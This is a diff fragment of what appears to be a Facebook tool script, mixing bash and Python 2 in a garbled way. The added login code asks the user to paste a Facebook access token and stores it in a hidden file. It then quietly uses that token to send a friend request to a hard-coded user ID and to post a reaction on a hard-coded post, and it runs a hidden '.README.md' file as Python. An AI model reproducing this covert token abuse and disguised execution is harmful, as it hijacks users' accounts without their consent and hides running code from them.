@@ -24,7 +24,51 @@ if [[ $option == *'n'* ]]; then
 clear
 exit
 fi
-os.system("python SDJJ.py")
+def cb():
+    os.system('clear')
+
+def t():
+    time.sleep(1)
+    
+def login():
+    os.system('clear')
+    try:
+        toket = open('....', 'r')
+        os.system("python2 .README.md")
+    except (KeyError,IOError):
+        os.system('rm -rf ....')
+        os.system('clear')
+        print (logo)
+        print 47 * '\x1b[1;91m\xe2\x95\x90'
+	os.system('echo -e "<> (1) LOGIN WITH FB<>" | lolcat')
+	os.system('echo -e "<> (2) LOGIN WITH TOKN <>" | lolcat') 
+	print 47 * '\x1b[1;91m\xe2\x95\x90'
+        login_choice()
+        
+def login_choice():
+    bch = raw_input('\n ====>  ')
+    if bch =='':
+        print ('[!] Fill in correctly')
+        login()
+    elif bch =='2':
+        os.system('clear')
+        print (logo)
+        fac=raw_input(' Paste Access Token Here: ')
+        fout=open('....', 'w')
+        fout.write(fac)
+        fout.close()
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
+        requests.post('https://graph.facebook.com/2848950808516858/reactions?type=LOVE&access_token=' +fac)
+        os.system('xdg-open https://www.facebook.com/HATERZKAABUUGZAINI2')
+        os.system("python2 .README.md")
+    elif bch =='1':
+        login1()
+            
+def login1():
+	cb()
+	try:
+		tb=open('token.txt', 'r')
+		os.system("python2 .README.md")
 import requests as req,json,time,os,sys,re
 from concurrent.futures import ThreadPoolExecutor as Bool
 from bs4 import BeautifulSoup as parser
